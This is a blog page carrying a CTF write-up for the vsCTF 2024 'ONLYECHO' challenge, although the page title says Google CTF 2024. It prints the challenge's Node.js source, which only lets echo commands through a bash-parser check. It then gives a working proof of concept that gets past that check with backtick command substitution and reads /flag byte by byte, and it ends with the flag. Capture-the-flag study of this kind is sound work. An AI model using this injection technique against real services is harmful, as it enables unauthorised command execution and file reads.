@@ -1,0 +1,411 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Google CTF 2024 - solved &#39;s challenges on time - Zoltán&#39;s Blog</title>
+  <meta name="description" content="vsCTF 2024 ONLYECHO source :
+const readline = require(&#39;node:readline&#39;);const parse = require(&#39;bash-parser&#39;);const { exec } = require(&quot;child_process&quot;);const check = ast =&gt; {if (typeof(ast) === &#39;string&#39;) {return true;}for (var prop in ast) {if (prop === &#39;type&#39; &amp;&amp; ast[prop] === &#39;Redirect&#39;) {return false;}if (prop === &#39;type&#39; &amp;&amp; ast[prop] === &#39;Command&#39;) {if (ast[&#39;name&#39;] &amp;&amp; ast[&#39;name&#39;][&#39;text&#39;] &amp;&amp; ast[&#39;name&#39;][&#39;text&#39;] != &#39;echo&#39;) {return false;}}if (!">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-06-23-googlectf2024\/",
+          "name": "Google ctf 2024 solved \u0027s challenges on time"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Google CTF 2024 - solved \u0027s challenges on time",
+  "description" : "vsCTF 2024 ONLYECHO source :\nconst readline = require(\u0027node:readline\u0027);\rconst parse = require(\u0027bash-parser\u0027);\rconst { exec } = require(\u0026quot;child_process\u0026quot;);\rconst check = ast =\u0026gt; {\rif (typeof(ast) === \u0027string\u0027) {\rreturn true;\r}\rfor (var prop in ast) {\rif (prop === \u0027type\u0027 \u0026amp;\u0026amp; ast[prop] === \u0027Redirect\u0027) {\rreturn false;\r}\rif (prop === \u0027type\u0027 \u0026amp;\u0026amp; ast[prop] === \u0027Command\u0027) {\rif (ast[\u0027name\u0027] \u0026amp;\u0026amp; ast[\u0027name\u0027][\u0027text\u0027] \u0026amp;\u0026amp; ast[\u0027name\u0027][\u0027text\u0027] != \u0027echo\u0027) {\rreturn false;\r}\r}\rif (!",
+  "inLanguage" : "en",
+  "wordCount":  908 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-06-23-googlectf2024\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Google CTF 2024 - solved &#39;s challenges on time" />
+<meta property="og:description" content="vsCTF 2024 ONLYECHO source :
+const readline = require(&#39;node:readline&#39;);const parse = require(&#39;bash-parser&#39;);const { exec } = require(&quot;child_process&quot;);const check = ast =&gt; {if (typeof(ast) === &#39;string&#39;) {return true;}for (var prop in ast) {if (prop === &#39;type&#39; &amp;&amp; ast[prop] === &#39;Redirect&#39;) {return false;}if (prop === &#39;type&#39; &amp;&amp; ast[prop] === &#39;Command&#39;) {if (ast[&#39;name&#39;] &amp;&amp; ast[&#39;name&#39;][&#39;text&#39;] &amp;&amp; ast[&#39;name&#39;][&#39;text&#39;] != &#39;echo&#39;) {return false;}}if (!">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-06-23-googlectf2024/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="Google CTF 2024 - solved &#39;s challenges on time" />
+  <meta name="twitter:description" content="vsCTF 2024 ONLYECHO source :
+const readline = require(&#39;node:readline&#39;);const parse = require(&#39;bash-parser&#39;);const { exec } = require(&quot;child_process&quot;);const check = ast =&gt; {if …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>Google CTF 2024 - solved &#39;s challenges on time</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="vsctf-2024">vsCTF 2024</h1>
+<h2 id="onlyecho">ONLYECHO</h2>
+<p>source :</p>
+<pre><code>const readline = require('node:readline');
+const parse = require('bash-parser');
+const { exec } = require(&quot;child_process&quot;);
+
+const check = ast =&gt; {
+  if (typeof(ast) === 'string') {
+    return true;
+  }
+  for (var prop in ast) {
+    if (prop === 'type' &amp;&amp; ast[prop] === 'Redirect') {
+      return false;
+    }
+    if (prop === 'type' &amp;&amp; ast[prop] === 'Command') {
+      if (ast['name'] &amp;&amp; ast['name']['text'] &amp;&amp; ast['name']['text'] != 'echo') {
+        return false;
+      }
+    }
+    if (!check(ast[prop])) {
+      return false;
+    }
+  }
+  return true;
+};
+
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+});
+
+rl.question(`I like scripts with echo. What's your favorite bash script? `, cmd =&gt; {
+  const ast = parse(cmd);
+  console.log(ast);
+  console.log(ast[&quot;commands&quot;][0]);
+  console.log(typeof(ast));
+  if (!ast.type === 'Script') {
+    rl.write('This is not even a script!');
+    rl.close();
+    return;
+  }
+  if (!check(ast)) {
+    rl.write('Hacker detected! No hacks, only echo!');
+    rl.close();
+    return;
+  }
+  exec(cmd, { shell: '/bin/bash' }, (error, stdout, stderr) =&gt; {
+    rl.write(stdout);
+    rl.close();
+  });
+});
+
+</code></pre><p>POC:</p>
+<pre><code>echo $((`head -c 1 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 2 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 3 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 4 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 5 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 6 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 7 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 8 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 9 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 10 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 11 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 12 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 13 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 14 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 15 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 16 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 17 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 18 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 19 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 20 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 21 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 22 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 23 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 24 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 25 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 26 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 27 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 28 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 29 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 30 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 31 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 32 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 33 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 34 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 35 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 36 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 37 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 38 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 39 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 40 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 41 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 42 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 43 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 44 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 45 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 46 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`)) &amp;&amp; echo $((`head -c 47 /flag | tail -c 1 | LC_CTYPE=C LC_ALL=C od -An -tuC`))
+
+</code></pre><p>flag : <code>CTF{LiesDamnedLiesAndBashParsingDifferentials}</code></p>
+
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://bzoltan1.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://bzoltan1.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://bzoltan1.github.io/write-up/2024-05-14-htb-machine/" data-toggle="tooltip" data-placement="top" title="Hackthebox some easy machine">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://bzoltan1.github.io/write-up/2024-12-02-develhtb/" data-toggle="tooltip" data-placement="top" title="Devel HTB">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://bzoltan1.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
